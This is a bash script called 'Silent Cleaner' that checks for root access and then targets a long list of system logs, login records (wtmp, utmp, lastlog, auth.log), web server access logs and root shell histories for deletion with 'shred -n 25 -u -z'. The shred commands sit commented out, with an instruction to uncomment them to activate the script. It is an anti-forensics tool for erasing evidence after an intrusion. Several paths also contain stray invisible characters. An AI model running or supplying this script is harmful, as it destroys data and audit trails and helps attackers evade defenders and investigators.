#!/bin/bash

cat << "EOF" 

   _____ _ _            _      _____ _                            
  / ____(_) |          | |    / ____| |                           
 | (___  _| | ___ _ __ | |_  | |    | | ___  __ _ _ __   ___ _ __ 
  \___ \| | |/ _ \ '_ \| __| | |    | |/ _ \/ _` | '_ \ / _ \ '__|
  ____) | | |  __/ | | | |_  | |____| |  __/ (_| | | | |  __/ |   
 |_____/|_|_|\___|_| |_|\__|  \_____|_|\___|\__,_|_| |_|\___|_|   
                                                            
        
                                                                  
EOF

#Colors 
Yellow='\033[1;33m' # Banner
Red='\033[0;31m' # Warnings
Green='\033[0;32m' # Done 

echo -e "${Yellow}Version 0.1 By Abdullah Hussam(@ahussam)" 
echo -e "${Yellow}--------------------------------------------------" 

#Check if the system is Linux 

BAR='####################'   # this is full bar, e.g. 20 chars
echo ""

for i in {1..20}; do
    echo -ne "\rChecking script requirements: ${BAR:0:$i}" # print $i chars of $BAR from 0 position
    sleep .1                 # wait 100ms between "frames"
done
echo ""

if [[ `uname` == *"Linux"* ]]; then
  echo -e "${Green}Linux system has been deteced!"
else
  echo -e "${Red}The system is not Linux! Are you sure you want to continue?(Y/N)\n"
  read yesorno 

case $yesorno in

  Y)
    echo -n -e "${Yellow}Working on it!\n"
    ;;

  N)
    echo -n -e "${Yellow}Exit\n"
    exit 1
    ;;

  *)
    echo -n -e "${Red}Unknown command\n"
    exit 1 
    ;;
esac
fi

#Check if the cuurent user is ROOT
if [[ $EUID -ne 0 ]]; then
   echo -n -e "${Red}This script must be run as root\n"
   exit 1
   else 
   echo -n -e "${Green}The user is ROOT!\n"
fi


echo -e "${Yellow}--------------------------------------------------" 

# Files array (the files that gonna be deleted and shreded) 

declare -a files=(
"/var/log/yum.log"
"/var/log/wtmp"
"/var/log/utmp"
"/var/log/secure"
"/var/log/mysqld.log"
"/var/log/mysql.log"
"/var/log/boot.log"
"/var/log/lighttpd"
"/var/log/httpd/"
"/var/log/qmail/"
"/var/log/maillog"
"/var/log/cron.log"
"/var/log/kern.log"
"/var/log/auth.log"
"/var/log/message"
"/var/log/lastlog‬‬"
"/var/adm/lastlog‬‬"
"/‪usr/adm/lastlog‬‬"
"/var/log/lastlog"
"/etc/utmp"
"/etc/wtmp"
"/var/adm"
"/var/log"
"/var/logs"
"/var/run/utmp"
"/var/apache/log"
"/var/apache/logs"
"/usr/local/apache/log"
"/usr/local/apache/logs"
"/root/.bash_logout"
"/root/.bash_history"
"/root/.ksh_history"
"/tmp/logs"
"/opt/lampp/logs/access_log"
"/var/log/nginx/access.log"
"/logs/agent_lo"
"/logs/referer_log"
"/logs/access_log"
"/var/log/apache2/access.log"
"/var/log/apache2/error.log"
"/var/log/apache2/other_vhosts_access.log"
"/var/log/wtmp")


echo -e "${Yellow}Deleting the following files: "
for i in "${files[@]}"
do
   # Un-Comment these 2 lines to activate the script
   # shred -n 25 -u -z $HISTFILE 
   # shred -n 25 -u -z $i 
    if test -f "$i"; then
    echo -e "${Red}$i: Has not been deleted!"
fi
done

 echo -e "\n"
 echo -e "\n"
  echo -e "${Green}Done!"
  exit 0 






